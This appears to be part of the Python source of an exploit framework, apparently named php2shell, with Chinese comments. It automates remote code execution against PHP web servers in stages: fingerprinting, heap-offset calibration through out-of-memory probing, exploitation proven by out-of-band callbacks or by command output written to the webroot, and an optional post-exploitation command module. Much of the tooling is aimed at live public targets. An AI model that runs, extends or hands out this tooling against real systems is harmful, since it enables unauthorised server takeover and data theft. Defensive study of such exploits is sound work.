            prof["_db_rce_ok"] = pid.get("rce_ok", True)
            prof["_db_label"] = pid.get("label", "")
    for k2, ak in (("ht_size", "ht_size"), ("htdata_offset", "htdata_offset"),
                   ("zif_offset", "zif_offset"), ("dtor_offset", "dtor_offset"),
                   ("stage1_n", "stage1_n"), ("stage2_t", "stage2_t")):
        v = getattr(a, ak, None)
        if v is not None:
            prof[k2] = v
            src += "+cli:%s" % k2
    prof["_src"] = src
    return prof


def oneclick_stop_exit(rc, verdict):
    """scan 已给出“不该继续”的结论时，返回要透传的 exit；否则 None。"""
    if rc in (20, 30, 40, 50):
        return rc
    v = (verdict or "").upper()
    if v in ("SAFE", "PATCHED", "NOT_AFFECTED_OR_PATCHED"):
        return 30
    if v == "UNREACHABLE":
        return 50
    if v == "AFFECTED_DOS_ONLY":
        return 20
    if v in ("NO_SINK", "NOSINK", "NO_SESSION_SINK", "BLOCKED"):
        return 40
    return None


def do_oneclick(a):
    """一条命令：指纹 → 前置判定 → 标定(可选) → 利用/盲验证 → 后渗透(可选) → 报告。"""
    url = a.url.rstrip("/") + "/"

    outdir = a.outdir or os.path.join(".", "oneclick_%s" % re.sub(r"\W+", "_", url)[:40])
    os.makedirs(outdir, exist_ok=True)
    rep = {"target": url, "started": time.strftime("%Y-%m-%dT%H:%M:%S"),
           "steps": [], "verdict": None, "rce": False, "exit": None, "artifacts": {}}

    def log(msg):
        print(msg, flush=True)

    # ---------- 1. 只读指纹 + 前置判定（复用 php2shell.py scan，json 落盘）
    log("[1/5] 指纹 + 前置判定 …")
    scan_json = os.path.join(outdir, "scan.json")
    cmd = [sys.executable, TOOL, "scan", "-u", url, "--json", "-o", scan_json,
           "--timeout", "%.1f" % a.timeout]
    if a.max_mb:
        cmd += ["--max-mb", str(a.max_mb)]
    if getattr(a, "stage1_n", None):
        cmd += ["--stage1-n", str(a.stage1_n)]
    if getattr(a, "rate", None):
        cmd += ["--rate", str(a.rate)]
    rc1, out1 = _run(cmd)
    scan = _load_json(scan_json) or {}
    ver = (scan.get("verdict") or ("rc%d" % rc1)).upper()
    _st = scan.get("steps") or {}
    _fp = _st.get("fingerprint") or {}
    _sinks = _st.get("sinks") or []
    rep["php_version"] = _fp.get("php_version") or scan.get("php_version")
    rep["server"] = _fp.get("server") or scan.get("server")
    rep["precondition"] = scan.get("precondition") or scan.get("pre")
    rep["sink"] = (_sinks[0].get("path") if _sinks else None) or _fp.get("sink_candidate")
    rep["steps"].append({"step": "scan", "rc": rc1, "verdict": ver,
                         "php_version": rep["php_version"], "server": rep["server"]})
    log("      PHP=%s  Server=%s" % (rep["php_version"], rep["server"]))
    log("      前置=%s  sink=%s" % (rep["precondition"], rep["sink"]))
    log("      判定=%s (rc=%d)" % (ver, rc1))
    rep["verdict"] = ver

    # scan 的 exit 已经给出了“不该继续”的强结论：不要再花一轮 exploit 去撞超时
    #   20=AFFECTED_DOS_ONLY / 30=NOT_AFFECTED_OR_PATCHED / 40=NO_SESSION_SINK / 50=UNREACHABLE
    stop = oneclick_stop_exit(rc1, ver)
    if stop is not None:
        rep["exit"] = stop
        _oneclick_finish(rep, outdir)
        return stop

    # 版本已在官方修复矩阵之外 → 直接判 SAFE，不做任何 OOM 探测
    if _is_patched(rep["php_version"]):
        rep["verdict"] = "PATCHED_BY_VERSION(%s)" % ver
        rep["exit"] = 30
        log("      版本 %s 已高于修复阈值 → PATCHED，停止探测" % rep["php_version"])
        _oneclick_finish(rep, outdir)
        return 30

    # 仅 DoS / 仅前置：不进攻击阶段
    if "DOS_ONLY" in ver or "DOS-ONLY" in ver:
        rep["exit"] = 20
        _oneclick_finish(rep, outdir)
        return 20
    if "PREMISES_ONLY" in ver and not getattr(a, "force", False):
        rep["exit"] = 15
        log("      仅前置条件满足（未验证 OOM）：加 --force 可强制进入攻击阶段")
        _oneclick_finish(rep, outdir)
        return 15

    # ---------- 2. profile 选择
    prof = _pick_profile(rep, a)
    rep["profile"] = {k: (hex(v) if isinstance(v, int) and k.endswith("offset") else v)
                      for k, v in prof.items() if not k.startswith("_")}
    rep["profile_source"] = prof.get("_src")
    rep["cap"] = cmd_cap(prof)
    log("[2/5] profile=%s  cap=%dB" % (rep["profile_source"], rep["cap"]))
    if prof.get("_needs_cal") and not a.force:
        log("      [!] 该 profile 只有 symbols 偏移；ht_size/htdata_offset 仍是 base 值。")
        log("          先在同构建环境跑 calibrate，或显式 --force（不推荐，等于盲打）。")
        rep["verdict"] = "NEEDS_CALIBRATION"
        rep["exit"] = 15
        _oneclick_finish(rep, outdir)
        return 15
    if prof.get("_db_rce_ok") is False and not (a.profile or a.zif_offset or a.dtor_offset):
        log("      [!] 该构建已知无 infoleak 原语：%s" % prof.get("_db_label", ""))
        rep["verdict"] = "AFFECTED_DOS_ONLY"
        rep["exit"] = 20
        _oneclick_finish(rep, outdir)
        return 20

    # ---------- 3. 攻击：有 collab 走盲验证；有写目录走 proof-dir；都没有则先标定
    attack_mode = None
    if a.collab:
        attack_mode = "blind"                      # 带外回调：真实目标首选，无需目标可写
    elif getattr(a, "http_read", None):
        attack_mode = "httpread"                   # 相对写入 webroot + HTTP 回读：无需挂载/无需出网
    elif a.dir and a.local_dir:
        attack_mode = "writeback"                  # 本地可回读目录（靶场/容器挂载）
    if attack_mode is None:
        log("[3/5] 缺少取证通道：给 --collab HOST:PORT（带外回调，最通用）"
            " / --http-read https://t/（目标 webroot 可写） / --dir+--local-dir（本地可回读）")
        rep["steps"].append({"step": "attack", "skipped": "no-oracle"})
        rep["exit"] = 10
        _oneclick_finish(rep, outdir)
        return 10

    if (a.calibrate or getattr(a, "auto_cal", False)) and a.collab:
        log("[3/5] 回调 oracle 标定 htdata_offset …")
        cmd = [sys.executable, os.path.abspath(__file__), "calibrate", "-u", url,
               "--ht-size", str(prof["ht_size"]), "--collab", a.collab,
               "--rounds", str(a.rounds), "--pause", str(a.pause),
               "--out", os.path.join(outdir, "profile_cal.json")]
        if getattr(a, "auto_cal", False):
            cmd += ["--htdata-window", a.calib_window, "--htdata-step", a.calib_step]
        elif a.htdata_offset:
            cmd += ["--htdata-window", "%#x:%#x" % (prof["htdata_offset"], prof["htdata_offset"])]
        rcc, outc = _run(cmd, timeout=3600)
        rep["steps"].append({"step": "calibrate", "rc": rcc})
        log("      calibrate rc=%d" % rcc)
        cal = _load_json(os.path.join(outdir, "profile_cal.json"))
        if cal:
            prof.update({k: v for k, v in cal.items() if v is not None})
            rep["calibrated"] = True

    log("[4/5] 攻击（%s）…" % attack_mode)
    if attack_mode == "blind":
        cmd = [sys.executable, os.path.abspath(__file__), "blind", "-u", url,
               "--collab", a.collab, "--token", a.token,
               "--rounds", str(a.rounds), "--pause", str(a.pause),
               "--listen-port", str(a.listen_port)]
        if a.listen:
            cmd += ["--listen"]
        if a.profile:
            cmd += ["--profile", a.profile]
        rca, outa = _run(cmd, timeout=3600)
        rep["steps"].append({"step": "blind", "rc": rca})
        rep["rce"] = (rca == 0)
        rep["artifacts"]["blind_log"] = os.path.join(outdir, "blind.log")
        with io.open(rep["artifacts"]["blind_log"], "w", encoding="utf-8") as f:
            f.write(outa)
        for ln in outa.splitlines():
            if "回调" in ln or "rc=" in ln:
                log("      " + ln.strip())
    elif attack_mode == "httpread":
        base = a.http_read.rstrip("/")
        _cap = cmd_cap(prof)
        _nm = "p%d" % (int(time.time()) % 1000)
        if len(("id>" + _nm).encode()) > _cap:
            _nm = "o%d" % (int(time.time()) % 10)
        proof_cmd = a.cmd or ("id>" + _nm)
        if len(proof_cmd.encode()) > _cap:
            proof_cmd = "id>" + _nm
            log("      [!] 自定义命令超 cap，回退：%s" % proof_cmd)
        read_url = "%s/%s" % (base, _nm)
        rep["proof_cmd"] = proof_cmd
        rep["proof_url"] = read_url
        log("      取证命令：%s (%dB / cap %dB) → %s"
            % (proof_cmd, len(proof_cmd.encode()), _cap, read_url))
        cmd = [sys.executable, os.path.join(os.path.dirname(os.path.abspath(__file__)), "php2shell.py"), "exploit", "-u", url,
               "-c", proof_cmd,
               "--zif-offset", "%#x" % prof["zif_offset"],
               "--dtor-offset", "%#x" % prof["dtor_offset"],
               "--htdata-offset", "%#x" % prof["htdata_offset"],
               "--ht-size", str(prof["ht_size"]),
               "--stage2-t", str(prof.get("stage2_t", 406)),
               "--timeout", "120",
               "--rounds", str(a.rounds)]
        if prof.get("stage1_n"):
            cmd += ["--stage1-n", str(prof["stage1_n"])]
        rca, outa = _run(cmd, timeout=3600)
        rep["steps"].append({"step": "exploit", "rc": rca})
        rep["artifacts"]["exploit_log"] = os.path.join(outdir, "exploit.log")
        with io.open(rep["artifacts"]["exploit_log"], "w", encoding="utf-8") as f:
            f.write(outa)
        body = _http_get(read_url) or ""
        baseline = _http_get(base.rstrip("/") + "/p2s-nx-%d"
                             % (int(time.time() * 1000) % 10 ** 8)) or ""
        expect = r"uid=\d+" if proof_cmd.startswith("id") else None
        ok = bool(body) and body.strip() != baseline.strip() and (
            expect is None or re.search(expect, body) is not None)
        rep["rce"] = ok
        rep["proof_body"] = (body or "")[:200]
        log("      HTTP 回读 %s → %s" % (read_url, "命中" if ok else "未命中"))
        if not ok:
            log("      [!] 可能原因：webroot 不可写 / cwd 非 webroot / 回读路径被拦截")
    else:
        _cap = cmd_cap(prof)
        _nm = "o%03d" % (int(time.time()) % 1000)
        proof_cmd = a.cmd or ("id>%s/%s" % (a.dir.rstrip("/"), _nm))
        if len(proof_cmd.encode()) > _cap:
            _min = "id>%s/o" % a.dir.rstrip("/")
            log("      [!] 自定义命令 %dB 超过 cap=%dB，回退最小取证命令：%s"
                % (len(proof_cmd.encode()), _cap, _min))
            proof_cmd = _min
        rep["proof_cmd"] = proof_cmd
        log("      取证命令：%s (%dB / cap %dB)" % (proof_cmd, len(proof_cmd.encode()), _cap))
        cmd = [sys.executable, TOOL, "exploit", "-u", url, "-c", proof_cmd,
               "--zif-offset", hex(prof["zif_offset"]),
               "--dtor-offset", hex(prof["dtor_offset"]),
               "--htdata-offset", hex(prof["htdata_offset"]),
               "--ht-size", str(prof["ht_size"]),
               "--stage2-t", str(prof.get("stage2_t", 406)),
               "--timeout", "120",
               "--rounds", str(a.rounds), "--proof-dir", a.local_dir]
        if prof.get("stage1_n"):
            cmd += ["--stage1-n", str(prof["stage1_n"])]
        rca, outa = _run(cmd, timeout=3600)
        rep["steps"].append({"step": "exploit", "rc": rca, "cmd": proof_cmd})
        # rc=0 只代表「本次运行新写了一个 proof 文件」；再核对本地回读内容
        _out = proof_cmd.rsplit(">", 1)[-1].strip()
        _pf = os.path.join(a.local_dir, os.path.basename(_out))
        _content = b""
        try:
            with open(_pf, "rb") as _f:
                _content = _f.read()
        except OSError:
            pass
        _expect = b"uid=" if proof_cmd.startswith("id") else b""
        rep["rce"] = bool(rca == 0 and _content and _expect in _content)
        rep["proof_body"] = _content.decode("utf-8", "replace")[:200]
        rep["artifacts"]["exploit_log"] = os.path.join(outdir, "exploit.log")
        with io.open(rep["artifacts"]["exploit_log"], "w", encoding="utf-8") as f:
            f.write(outa)
        for ln in outa.splitlines():
            if "Stage" in ln or "proof" in ln or ln.startswith("uid="):
                log("      " + ln.strip())
    log("      RCE=%s" % ("YES" if rep["rce"] else "NO"))
    rep["scan_verdict"] = rep["verdict"]
    rep["verdict"] = "RCE_CONFIRMED" if rep["rce"] else "LIKELY_RCE_NOT_VERIFIED"

    # ---------- 5. 可选后渗透
    if rep["rce"] and a.postex:
        log("[5/5] 后渗透取证 …")
        cmd = [sys.executable, os.path.abspath(__file__), "postex", "-u", url,
               "--ht-size", str(prof["ht_size"]),
               "--htdata-offset", hex(prof["htdata_offset"]),
               "--zif-offset", hex(prof["zif_offset"]),
               "--dtor-offset", hex(prof["dtor_offset"]),
               "--rounds", str(a.rounds), "--outdir", os.path.join(outdir, "postex")]
        if a.dir and a.local_dir:
            cmd += ["--dir", a.dir, "--local-dir", a.local_dir]
        if a.profile:
            cmd += ["--profile", a.profile]
        if getattr(a, "only", None):
            cmd += ["--only", a.only]
        if getattr(a, "tries", None):
            cmd += ["--tries", str(a.tries)]
        rcp, outp = _run(cmd, timeout=7200)
        rep["postex_rc"] = rcp
        rep["steps"].append({"step": "postex", "rc": rcp})
        rep["artifacts"]["postex_dir"] = os.path.join(outdir, "postex")
        log("      postex rc=%d" % rcp)
    else:
        log("[5/5] 后渗透：跳过（%s）" % ("未拿到 RCE" if not rep["rce"] else "未加 --postex"))

    rep["exit"] = 0 if rep["rce"] else 10
    _oneclick_finish(rep, outdir)
    return rep["exit"]


def _oneclick_finish(rep, outdir):
    rep["finished"] = time.strftime("%Y-%m-%dT%H:%M:%S")
    path = os.path.join(outdir, "oneclick_report.json")
    with io.open(path, "w", encoding="utf-8") as f:
        json.dump(rep, f, ensure_ascii=False, indent=1)
    print("--- oneclick 结论 ---")
    print("target      : %s" % rep["target"])
    print("php_version : %s" % rep.get("php_version"))
    print("verdict     : %s" % rep.get("verdict"))
    print("rce         : %s" % ("YES" if rep.get("rce") else "NO"))
    print("exit        : %s" % rep.get("exit"))
    print("report      : %s" % path)


def do_recon(a):
    """委派给 attack/recon.py（真实站点侦察：版本/消费点/落点/偏移四前置分级）。"""
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import recon
    argv = ["-u", a.url]
    if a.insecure:
        argv.append("--insecure")
    if a.entries:
        argv += ["--entries", a.entries]
    if a.deep:
        argv += ["--deep", "--probe-sizes", a.probe_sizes,
                 "--budget", str(a.budget), "--delay", str(a.delay)]
    if getattr(a, "fast", False):
        argv.append("--fast")
    if a.json:
        argv.append("--json")
    if a.ua:
        argv += ["--ua", a.ua]
    argv += ["--timeout", str(a.timeout)]
    if getattr(a, "verbose", False):
        argv.append("-v")
    return recon.main(argv)


def main():
    try:
        import_profile_store(verbose=True)
    except Exception:
        pass
    ap = argparse.ArgumentParser(description="php2shell 扩展：符号推导 + 跨版本标定 + 后渗透")
    sub = ap.add_subparsers(dest="cmd", required=True)

    s = sub.add_parser("symbols", help="从 libphp.so 符号表推导 zif/dtor 偏移")
    s.add_argument("--elf")
    s.add_argument("--docker", help="容器名[:容器内路径]")
    s.add_argument("--out")
    s.set_defaults(func=do_symbols)

    b = sub.add_parser("blind", help="盲验证：带外回调证明命令执行（真实公网无回读通道时使用）")
    b.add_argument("-u", "--url", required=True)
    b.add_argument("--profile")
    b.add_argument("--ht-size", type=int)
    b.add_argument("--zif-offset", type=lambda x: int(x, 0))
    b.add_argument("--dtor-offset", type=lambda x: int(x, 0))
    b.add_argument("--htdata-offset", type=lambda x: int(x, 0))
    b.add_argument("--stage2-t", type=int)
    b.add_argument("--collab", required=True, help="协作端，形如 h:9000（需落在命令容量内）")
    b.add_argument("--token", default="p1", help="回调路径 token（2 字符以内最省字节）")
    b.add_argument("--listen", action="store_true", default=True)
    b.add_argument("--no-listen", dest="listen", action="store_false")
    b.add_argument("--listen-port", type=int, default=9000)
    b.add_argument("--rounds", type=int, default=8)
    b.add_argument("--pause", type=float, default=0.6)
    b.add_argument("--wait", type=float, default=10)
    b.add_argument("--timeout", type=float, default=90)
    b.set_defaults(func=do_blind)

    f = sub.add_parser("fingerprint", help="只读指纹：不触发 OOM 的版本/暴露面判定")
    f.add_argument("-u", "--url", required=True)
    f.add_argument("--max-paths", type=int, default=5)
    f.add_argument("--timeout", type=float, default=10)
    f.set_defaults(func=do_fingerprint)

    c = sub.add_parser("calibrate", help="标定 ht_size / htdata_offset / stage2_t")
    c.add_argument("-u", "--url", required=True)
    c.add_argument("--profile")
    c.add_argument("--ht-size", type=int)
    c.add_argument("--ht-size-lo", type=int, default=151)
    c.add_argument("--ht-size-hi", type=int, default=215)
    c.add_argument("--ht-size-step", type=int, default=8)
    c.add_argument("--htdata-window", help="如 0x680000:0x700000")
    c.add_argument("--htdata-step", type=lambda x: int(x, 0), default=0x100)
    c.add_argument("--zif-offset", type=lambda x: int(x, 0))
    c.add_argument("--dtor-offset", type=lambda x: int(x, 0))
    c.add_argument("--htdata-offset", type=lambda x: int(x, 0))
    c.add_argument("--stage1-n", type=int)
    c.add_argument("--stage2-t", type=int)
    c.add_argument("--rounds", type=int, default=8)
    c.add_argument("--tries", type=int, default=2)
    c.add_argument("--pause", type=float, default=0.6, help="每次尝试后停顿秒数")
    c.add_argument("--dir", help="绝对目录通道（如 /out），需配 --local-dir")
    c.add_argument("--local-dir", dest="local_dir", help="与 --dir 对应的本机/宿主目录")
    c.add_argument("--out")
    c.add_argument("--collab", help="带外回调 oracle：collab 形如 h:9000（无需回读通道）")
    c.add_argument("--listen-port", type=int, default=9000)
    c.set_defaults(func=do_calibrate)

    p = sub.add_parser("postex", help="RCE 后攻击命令库（≤14B）")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--profile")
    p.add_argument("--ht-size", type=int)
    p.add_argument("--zif-offset", type=lambda x: int(x, 0))
    p.add_argument("--dtor-offset", type=lambda x: int(x, 0))
    p.add_argument("--htdata-offset", type=lambda x: int(x, 0))
    p.add_argument("--stage2-t", type=int)
    p.add_argument("--only")
    p.add_argument("--rounds", type=int, default=8)
    p.add_argument("--tries", type=int, default=3)
    p.add_argument("--dir", help="绝对写目录通道（如 /out 或 /tmp），需配 --local-dir 回读")
    p.add_argument("--local-dir", dest="local_dir", help="与 --dir 对应的本机/宿主目录")
    p.add_argument("--pause", type=float, default=0.6)
    p.add_argument("--outdir")
    p.add_argument("--cleanup", action="store_true")
    p.set_defaults(func=do_postex)


    p = sub.add_parser("oneclick", help="一条命令：指纹→前置→标定→利用/盲验证→后渗透→报告")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--collab", help="带外回调协作端 host:port（公网推荐，无需目标可写目录）")
    p.add_argument("--token", default="p1", help="回调路径 token（默认 p1）")
    p.add_argument("--listen", action="store_true", help="本机自动起回调监听")
    p.add_argument("--listen-port", dest="listen_port", type=int, default=9000)
    p.add_argument("--calibrate", action="store_true", help="先用回调 oracle 标定 htdata_offset")
    p.add_argument("--http-read", dest="http_read", metavar="BASEURL",
                   help="真实目标首选通道：相对写入 webroot 后用它回读，如 https://t/")
    p.add_argument("--dir", help="目标绝对可写目录（如 /out），配 --local-dir 回读")
    p.add_argument("--local-dir", dest="local_dir", help="与 --dir 对应的本机目录")
    p.add_argument("--cmd", help="自定义取证命令（默认 id><--dir>/oneclick_<ts>）")
    p.add_argument("--auto-calibrate", dest="auto_cal", action="store_true",
                   help="未知构建时自动扫 htdata 窗口标定（会产生多次 OOM）")
    p.add_argument("--calib-window", dest="calib_window", default="0x68000:0x6C000")
    p.add_argument("--calib-step", dest="calib_step", default="0x100")
    p.add_argument("--tries", type=int, default=3, help="postex 每条命令重试次数（默认 3）")
    p.add_argument("--force", action="store_true", help="跳过 PREMISES_ONLY 早退，强制攻击（自行确认前置）")
    p.add_argument("--postex", action="store_true", help="拿到 RCE 后自动跑后渗透取证")
    p.add_argument("--only", help="postex 仅跑指定项（逗号分隔，如 id,env,ps）")
    p.add_argument("--profile")
    p.add_argument("--ht-size", type=int)
    p.add_argument("--zif-offset", type=lambda x: int(x, 0))
    p.add_argument("--dtor-offset", type=lambda x: int(x, 0))
    p.add_argument("--htdata-offset", type=lambda x: int(x, 0))
    p.add_argument("--stage1-n", type=int)
    p.add_argument("--stage2-t", type=int)
    p.add_argument("--rounds", type=int, default=8)
    p.add_argument("--pause", type=float, default=0.4)
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--max-mb", dest="max_mb", type=int, default=24)
    p.add_argument("--rate", type=float, default=0)
    p.add_argument("--outdir")
    p.set_defaults(func=do_oneclick)

    p = sub.add_parser("recon",
                       help="真实站点侦察：多版本取证+session消费点+落点+偏移匹配（默认只读）")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--entries", default="", help="自定义入口列表（逗号分隔）")
    p.add_argument("--deep", action="store_true",
                   help="开启落点探测（递增体积 multipart；可能造成 5xx，需授权）")
    p.add_argument("--fast", action="store_true",
                   help="快速模式：只查首页版本 + 最多 2 个 sink 入口（2–3 个请求），跳过大体积探测")
    p.add_argument("--probe-sizes", dest="probe_sizes", default="0.5,1,2,4,8,16")
    p.add_argument("--budget", type=int, default=6)
    p.add_argument("--delay", type=float, default=1.0)
    p.add_argument("--json", action="store_true")
    p.add_argument("--ua")
    p.add_argument("--timeout", type=float, default=12.0)
    p.add_argument("-v", "--verbose", action="store_true")
    p.set_defaults(func=do_recon)

    # 统一给所有子命令加 --insecure（https 自签/过期证书靶场需要）
    for _sp in sub.choices.values():
        if not any(a.dest == "insecure" for a in _sp._actions):
            _sp.add_argument("--insecure", action="store_true",
                             help="https 目标跳过 TLS 证书校验（自签靶场）；默认严格校验")

    a = ap.parse_args()
    if getattr(a, "insecure", False):
        import os as _os
        _os.environ["PHP2SHELL_INSECURE"] = "1"
        try:
            import poc_109618 as _P
            _P.DEFAULT_INSECURE = True
        except Exception:
            pass
    sys.exit(a.func(a))


if __name__ == "__main__":
    main()
